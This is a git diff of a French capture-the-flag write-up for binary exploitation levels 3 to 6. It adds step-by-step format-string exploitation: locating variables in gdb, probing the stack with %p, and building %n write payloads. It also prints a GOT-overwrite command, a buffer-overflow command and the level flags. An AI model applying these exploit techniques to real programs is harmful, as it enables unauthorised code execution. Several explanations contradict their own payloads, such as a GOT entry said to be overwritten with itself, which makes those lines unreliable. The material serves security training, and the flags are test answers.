@@ -69,7 +69,7 @@ Etapes:
         break v
         p &m $3 = (<data variable, no debug info> *) 0x804988c
     - trouver l'adresse de ma string :
-        python -c 'print "AAAA" + " %p" * 10' - | ./level3
+        python -c 'print "AAAA" + " %p" * 20' - | ./level3
         AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
         AAAA est ecrite a la 4 eme adresse donc il faut ecrire sur le 4 em argument ==> %4$n on indique a printf d ecrire sur le 4em argument
     - on a besoin qu il ecrive 64 donc \x8c\x98\x04\x08" + "%60c", 4 octet pour l'adress + 64 caracteres  
@@ -88,7 +88,30 @@ Etapes:
 
 **Exploit**: Format String avec écriture arbitraire  
 **Commande**: `python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' > /tmp/exploit4`
-**Explication**: Dans cet exploit, nous utilisons la vulnérabilité de chaîne de format pour écrire une valeur arbitraire dans la mémoire. Nous écrasons l'adresse de retour avec l'adresse de la fonction info pour afficher le contenu de la mémoire.
+**Explication**: Dans cet exploit, nous utilisons la vulnérabilité de chaîne de format pour écrire une valeur arbitraire dans la mémoire.
+Etapes:
+    Ici c'est pratiquement la meme chose que le level3
+    - Cette condition est importante :  if (m == 0x1025544) {
+            system("/bin/cat /home/user/level5/.pass");
+    }
+    Il faut que m soit egale a 0x1025544 (16930116)
+    - Trouver l'adresse de m
+        gdb ./level
+        break n
+        p &m
+        $1 = (<data variable, no debug info> *) 0x8049810
+    - Trouver l'adresse de ma string :
+        python -c 'print "AAAA" + " %p" * 20' - | ./level4
+        AAAA = 0x41414141
+        AAAA 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
+        0x41414141 se trouve a la 12 eme position
+    - On construit notre payload : 
+        L'adresse ou ecrire : \x10\x98\x04\x08
+        Le nombre de caractere : 16930116 - 4 (4 octets de l'adresse) = 16930112
+        %12$n pour ecrire au 12 argument
+        \x8c\x98\x04\x08" + "%60c" + "%4$n
+    - \x10\x98\x04\x08" + "%16930112c" + "%12$n
+    
 **Flag** : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 
 **Sources**:
@@ -107,7 +130,7 @@ Etapes:
 - o : 080484a4 
 - exit : 08049838
 **Commande**: `python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"' > /tmp/exploit5`  
-**Explication**: Dans cet exploit, nous écrasons une entrée dans la table GOT pour rediriger l'exécution vers notre propre code. Nous écrasons l'adresse de la fonction o dans la table GOT avec l'adresse de la fonction system.
+**Explication**: Dans cet exploit, nous écrasons une entrée dans la table GOT pour rediriger l'exécution vers notre propre code. Nous écrasons l'adresse de la fonction o dans la table GOT avec l'adresse de la fonction o.
 **Flag** : d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 
 **Sources**:
@@ -117,7 +140,7 @@ Etapes:
 ## Level 6
 
 **Exploit**: Buffer Overflow avec shellcode  
-**Commande**: `$(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')`  
+**Commande**: `./level6 $(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')`  
 **Explication**: Ici, nous exploitons une vulnérabilité de débordement de tampon pour écraser l'adresse de retour avec l'adresse de la fonction m(). Ensuite, nous exécutons un shellcode pour obtenir un shell interactif.
 **Flag** : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
